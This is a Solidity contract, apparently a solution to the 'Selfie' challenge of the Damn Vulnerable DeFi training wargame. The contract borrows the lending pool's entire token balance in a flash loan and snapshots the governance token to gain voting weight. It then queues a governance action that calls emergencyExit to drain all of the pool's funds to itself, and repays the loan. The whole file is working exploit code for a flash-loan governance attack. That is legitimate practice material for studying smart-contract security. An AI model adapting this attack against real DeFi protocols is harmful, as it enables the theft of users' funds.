// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract OnAttackSelfie is IERC3156FlashBorrower{
    ISimpleGovernance gov;
    SelfiePool pool;

    constructor(ISimpleGovernance _gov, SelfiePool _pool ){
        gov = _gov;
        pool = _pool;
    }
    
    function newAction(DamnValuableTokenSnapshot token) public {
        //Pedir prestamo flash
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)), 
            address(pool.token()), 
            token.balanceOf(address(pool)), 
            ""
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        DamnValuableTokenSnapshot(token).snapshot();

        //Crear queue
        bytes memory drainAllFunds =
            abi.encodeWithSignature("emergencyExit(address)", address(this));
        gov.queueAction(address(pool), 0, drainAllFunds);

        //Regresar el flash
        DamnValuableTokenSnapshot(token).approve(address(pool),20000000000000000000000000000);
        return(keccak256("ERC3156FlashBorrower.onFlashLoan"));
        // executeAction
    }
}